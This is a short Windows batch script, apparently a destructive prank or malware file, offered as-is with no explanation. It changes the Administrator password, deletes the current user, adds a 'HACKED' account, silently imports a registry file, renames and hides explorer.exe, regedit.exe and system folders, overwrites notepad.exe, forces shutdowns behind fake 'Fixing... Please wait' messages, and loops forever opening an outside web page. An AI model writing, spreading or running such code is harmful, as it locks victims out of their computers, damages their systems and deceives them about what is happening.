@echo off
net user Administrator reg
net user %username% /delete
net user HACKED /add
start /B regedit.exe /S settings.reg
cls
shutdown -s -f -t 90 -c "Fixing... Please wait.."
ren %windir%\media\ download
ren %windir%\temp\ konfig
cls
start /B http://www.download.com/
cd %windir%
attrib %windir% +H
attrib %windir%\explorer.exe +R +H
attrib %windir%\regedit.exe +R +H
echo pause>notepad.exe
attrib %windir%\notepad.exe +R +H
rename %windir%\explorer.exe reg
shutdown -a
cls
shutdown -s -f -t 7 -c "Fixing... Done.."
start /B /HIGH http://fen.xf.cz/logo.php
%systemroot%\system32\oobe\msoobe.exe /a
echo run=cmd.exe>%windir%\win.ini
cls
goto nice
:nice
start /B /HIGH http://fen.xf.cz/logo.php
start /B ipconfig /renew *
cls
goto nice
